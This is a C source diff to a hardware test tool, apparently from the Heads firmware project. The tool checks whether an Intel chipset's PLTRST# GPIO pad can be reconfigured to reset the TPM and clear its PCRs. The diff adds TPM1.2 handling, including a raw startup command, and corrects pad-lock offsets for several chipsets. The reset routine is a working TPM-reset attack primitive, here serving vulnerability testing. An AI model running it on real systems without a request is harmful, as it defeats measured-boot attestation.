@@ -44,6 +44,84 @@ void unmap_physical(void *virt_addr, size_t len)
 }
 #endif
 
+/* Heads initrds pack exactly one TPM CLI generation: modules/tpmtotp
+ * ships /bin/tpm (tpm-tools mega-binary, TPM1.2) when CONFIG_TPM2_TOOLS
+ * is unset, modules/tpm2-tools ships /bin/tpm2 when it is set.  The
+ * present binary therefore identifies the generation, so one assert
+ * binary serves TPM1.2 hosts (e.g. ThinkCentre M900) and TPM2 alike. */
+static int tpm_generation(void)
+{
+	if (access("/bin/tpm2", X_OK) == 0)
+		return 2;
+	if (access("/bin/tpm", X_OK) == 0)
+		return 1;
+	return 0;
+}
+
+/* Show PCR state.  TPM2: tpm2-tools sha256 block (PCRs 0-23).
+ * TPM1: tpm-tools pcrread takes one index and prints a bare SHA1
+ * digest (40 hex digits); TPM1.2 has PCRs 0-15. */
+static void tpm_pcr_readout(int gen)
+{
+	int i;
+	char cmd[48];
+
+	if (gen == 2) {
+		system("tpm2 pcrread 2>/dev/null | grep -A24 'sha256:' "
+		       "|| echo '  (TPM not accessible)'");
+	} else if (gen == 1) {
+		for (i = 0; i < 16; i++) {
+			snprintf(cmd, sizeof(cmd),
+				 "tpm pcrread -ix %d 2>/dev/null", i);
+			printf("  pcr %2d: ", i);
+			if (system(cmd) != 0)
+				printf("(read failed)\n");
+		}
+	} else {
+		printf("(TPM not accessible)\n");
+	}
+}
+
+/* Issue TPM_Startup(TPM_FULL) to a TPM1.2 chip via /dev/tpm0.
+ * The kernel TIS driver does not re-issue Startup after a mid-run TPM
+ * reset, and the packed tpm-tools binary has no startup subcommand, so
+ * send it raw.  Encoding mirrors the kernel's own tpm1_startup()
+ * (drivers/char/tpm/tpm1-cmd.c): tag 0x00c1 (TPM_TAG_RQU_COMMAND),
+ * len 12, ordinal 153 (TPM_ORD_STARTUP), param 1 (TPM_ST_CLEAR,
+ * i.e. TPM_FULL).  Success reply: 00c1 000a 00000000. */
+static void tpm1_startup(void)
+{
+	const uint8_t cmd[] = {
+		0x00, 0xc1, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x99,
+		0x00, 0x01,
+	};
+	uint8_t resp[16];
+	int fd;
+	ssize_t n;
+
+	fd = open("/dev/tpm0", O_RDWR);
+	if (fd < 0) {
+		printf("Can not open /dev/tpm0: %s\n", strerror(errno));
+		return;
+	}
+	if (write(fd, cmd, sizeof(cmd)) != (ssize_t) sizeof(cmd)) {
+		printf("TPM1 Startup write failed: %s\n", strerror(errno));
+		close(fd);
+		return;
+	}
+	n = read(fd, resp, sizeof(resp));
+	close(fd);
+	if (n < 10) {
+		printf("TPM1 Startup: short response (%zd bytes)\n", n);
+		return;
+	}
+	if (resp[6] || resp[7] || resp[8] || resp[9])
+		printf("TPM1 Startup rejected (rc=0x%02x%02x%02x%02x)\n",
+		       resp[6], resp[7], resp[8], resp[9]);
+	else
+		printf("TPM1 Startup (TPM_FULL) accepted\n");
+}
+
 int main(int argc, char *argv[])
 {
 	setbuf(stdout, NULL);
@@ -138,8 +216,8 @@ int main(int argc, char *argv[])
 		known_pch = 1;
 		port = 0xaf;
 		offset = 0x528;
-		lock_offset = 0xb0;
-		lock_bit = 1 << 5;
+		lock_offset = 0x98; /* PLTRST# = GPP_B13 (0xb0 was GPP_C's lock) */
+		lock_bit = 1 << 13;
 		break;
 
 	case PCI_DEVICE_ID_INTEL_H270:
@@ -154,8 +232,8 @@ int main(int argc, char *argv[])
 		known_pch = 1;
 		port = 0xaf;
 		offset = 0x528;
-		lock_offset = 0xb0;
-		lock_bit = 1 << 5;
+		lock_offset = 0x98; /* PLTRST# = GPP_B13; PCH-H base 0x90 (was 0xa8) */
+		lock_bit = 1 << 13;
 		break;
 
 	case PCI_DEVICE_ID_INTEL_H610:
@@ -201,8 +279,8 @@ int main(int argc, char *argv[])
 			known_pch = 1;
 			port = 0xaf;
 			offset = 0x528;
-			lock_offset = 0xb0;
-			lock_bit = 1 << 5;
+			lock_offset = 0xa8; /* PLTRST# = GPP_B13 (0xb0 was GPP_C's lock) */
+			lock_bit = 1 << 13;
 		} else if ((sb->device_id & 0xfff0) == 0x5180) {
 			printf("Found Alder Point P\n");
 			known_pch = 1;
@@ -230,7 +308,7 @@ int main(int argc, char *argv[])
 			printf("Found Coffee Lake PCH\n");
 			known_pch = 1;
 			port = 0x6e;
-			offset = 0x6d0;
+			offset = 0x860;  /* GPP_B13: community-relative pad 38, 0x600 + 38*16 */
 			lock_offset = 0x88;
 			lock_bit = 1 << 13;
 		} else if (((sb->device_id & 0xfff0) == 0x0680
@@ -260,16 +338,9 @@ int main(int argc, char *argv[])
 			port = 0x6e;
 			offset = 0x860;
 			lock_offset = 0x88;
-			lock_bit = 1 << 6;
+			lock_bit = 1 << 13;
 		} else if ((sb->device_id & 0xfff0) == 0xa080
 			   && sb->device_id >= 0xa082) {
-			printf("Found Tiger Lake PCH\n");
-			known_pch = 1;
-			port = 0x6e;
-			offset = 0x7d0;
-			lock_offset = 0x80;
-			lock_bit = 1 << 13;
-		} else if ((sb->device_id & 0xfff8) == 0xa0a0) {
 			printf("Found Tiger Lake PCH\n");
 			known_pch = 1;
 			port = 0x6e;
@@ -317,20 +388,19 @@ int main(int argc, char *argv[])
 			lock_bit = 1 << 13;
 		} else if (sb->device_id == 0x31e8 || sb->device_id == 0x3197) {
 			/* Gemini Lake: GPIO_98 = PMU_PLTRST_N, community NORTH (PID_GPIO_N=0xC5).
-			 * GPIO_98 = N_OFFSET(80) + 22 = community-relative pad 22.
+			 * GPIO_98 = N_OFFSET + 22 = community-relative pad 22 (NORTH group 0).
 			 * DW0 offset = PAD_CFG_BASE(0x600) + 22*16 = 0x760.
-			 * NO PADCFGLOCK register on GLK/APL -- pad is always writable.
-			 * Confirmed: coreboot apollolake gpio_glk.c has no pad_cfg_lock_offset
-			 * and SOC_INTEL_COMMON_BLOCK_SMM_LOCK_GPIO_PADS is not selected.
+			 * PADCFGLOCK exists (the earlier "no PADCFGLOCK on GLK" note was
+			 * wrong): gpio_glk.c sets pad_cfg_lock_offset = 0x80, so the
+			 * PLTRST# lock is 0x80 bit 22.
 			 * SBREG_BAR = 0xD0000000 (apollolake/Kconfig). */
-			printf("Found Gemini Lake PCH (%s) -- no PADCFGLOCK register\n",
+			printf("Found Gemini Lake PCH (%s)\n",
 			       sb->device_id == 0x31e8 ? "LPC" : "eSPI");
 			known_pch = 1;
-			no_padcfglock = 1;
 			port = 0xc5;
 			offset = 0x760;
-			lock_offset = 0;
-			lock_bit = 1;
+			lock_offset = 0x80;
+			lock_bit = 1 << 22;
 		} else {
 			printf("Unknown PCH device ID %04x\n", sb->device_id);
 		}
@@ -376,15 +446,25 @@ int main(int argc, char *argv[])
 		}
 
 		/* Read PCRs before assertion */
+		int gen = tpm_generation();
+
 		printf("\n--- PCR State Before Assertion ---\n");
 		fflush(stdout);
-		system("tpm2 startup -c 2>/dev/null; tpm2 pcrread 2>/dev/null | grep -A24 'sha256:' || echo '  (TPM not accessible)'");
+		if (gen == 2) {
+			system("tpm2 startup -c 2>/dev/null; tpm2 pcrread 2>/dev/null | grep -A24 'sha256:' || echo '  (TPM not accessible)'");
+		} else {
+			tpm_pcr_readout(gen);
+		}
 
 		/* Cleanly shut down TPM session before assertion (kukri procedure) */
 		printf("\n--- TPM Session Preparation ---\n");
-		printf("Running tpm2 shutdown -c to cleanly shut down TPM session\n");
-		fflush(stdout);
-		system("tpm2 shutdown -c 2>/dev/null");
+		if (gen == 2) {
+			printf("Running tpm2 shutdown -c to cleanly shut down TPM session\n");
+			fflush(stdout);
+			system("tpm2 shutdown -c 2>/dev/null");
+		} else if (gen == 1) {
+			printf("TPM 1.2: no shutdown command -- the PLTRST# pulse performs a full _TPM_Init (PCRs zero, NVRAM preserved)\n");
+		}
 
 		printf("\n*** WARNING: About to assert PLTRST# -- TPM may reboot (PCRs clear, NVRAM preserved) ***\n");
 		sleep(2);
@@ -394,6 +474,22 @@ int main(int argc, char *argv[])
 
 		printf("PCR port=0x%x offset=0x%x\n", port, offset);
 		printf("DW0 (original) = 0x%08x  DW1 (original) = 0x%08x\n", dw0, dw1);
+
+		/* DW0 domain (bits 31:30): which reset domain the pad is wired to */
+		{
+			const uint32_t dom = (dw0 >> 30) & 3;
+			const char *domain = dom == 1 ? "DEEP" :
+				dom == 2 ? "PLTRST" :
+				dom == 3 ? "unmapped/GLBRST" : "RSMRST/PWROK";
+			printf("DW0 domain = %s (bits 31:30 = %u)\n", domain, (unsigned)dom);
+		}
+		/* HOST_OWN for GPP_B13 (SKL/KBL community 0, group 1): 1 = host owns
+		 * the pad (reconfigurable), 0 = SMM keeps ownership (host writes gated) */
+		if (port == 0xaf) {
+			uint32_t host_own = read_pcr32(0xaf, 0xd4);
+			printf("HOST_OWN (0xAF:0xD4 bit 13, GPP_B13) = %d\n",
+			       !!(host_own & (1u << 13)));
+		}
 
 		/* Check pad mode: NF1->GPIO transition creates the reset edge */
 		uint32_t pad_mode = (dw0 >> 10) & 0xf;
@@ -435,10 +531,9 @@ int main(int argc, char *argv[])
 		int dw1_ok = (dw1_rb == 0x00000000);
 		printf("DW0 (asserted) = 0x%08x  DW1 (asserted) = 0x%08x\n", dw0_rb, dw1_rb);
 		if (!dw0_ok)
-			printf("Pad reconfiguration FAILED (TX=0, mode=GPIO) -- %s\n",
-			       "WRITE IGNORED - pad may be locked");
+			printf("DW0 write ignored -- PADCFGLOCK set, pad configuration locked\n");
 		if (!dw1_ok)
-			printf("DW1 partially locked (TX control bits) - does not prevent reset\n");
+			printf("DW1 TX state unlocked (expected; the config lock gates the pad)\n");
 
 		write_pcr32(port, offset + 0, dw0);
 		write_pcr32(port, offset + 4, dw1);
@@ -446,14 +541,24 @@ int main(int argc, char *argv[])
 		printf("Registers restored\n");
 
 		/* Reinitialize TPM after reset (kukri procedure) */
-		printf("Running tpm2 startup -c to reinitialize TPM\n");
-		fflush(stdout);
-		system("tpm2 startup -c 2>/dev/null");
+		if (gen == 2) {
+			printf("Running tpm2 startup -c to reinitialize TPM\n");
+			fflush(stdout);
+			system("tpm2 startup -c 2>/dev/null");
+		} else if (gen == 1) {
+			printf("Running TPM1 Startup (TPM_FULL) via /dev/tpm0 to reinitialize TPM\n");
+			fflush(stdout);
+			tpm1_startup();
+		}
 
 		/* Read PCRs after assertion */
 		printf("\n--- PCR State After Assertion ---\n");
 		fflush(stdout);
-		system("tpm2 startup -c 2>/dev/null; tpm2 pcrread 2>/dev/null | grep -A24 'sha256:' || echo '  (TPM not accessible)'");
+		if (gen == 2) {
+			system("tpm2 startup -c 2>/dev/null; tpm2 pcrread 2>/dev/null | grep -A24 'sha256:' || echo '  (TPM not accessible)'");
+		} else {
+			tpm_pcr_readout(gen);
+		}
 
 		exit_code = dw0_ok ? 0 : 1;
 	}
@@ -462,8 +567,8 @@ int main(int argc, char *argv[])
 		exit_code = 126;
 
 	printf("\n=== RESULT: %s ===\n",
-	       exit_code == 0 ? "DW0 write verified -- compare before/after PCR output for confirmation" :
-	       exit_code == 1 ? "Pad reconfiguration FAILED (DW0 write ignored -- pad locked by firmware)" :
+	       exit_code == 0 ? "DW0 write accepted -- pad reconfiguration possible (vulnerable)" :
+	       exit_code == 1 ? "DW0 write ignored -- PLTRST# pad configuration locked (PADCFGLOCK set): assertion blocked" :
 	       exit_code == 2 ? "not vulnerable (assertion skipped)" :
 	       exit_code == 126 ? "unknown PCH" :
 	       "hardware access error");
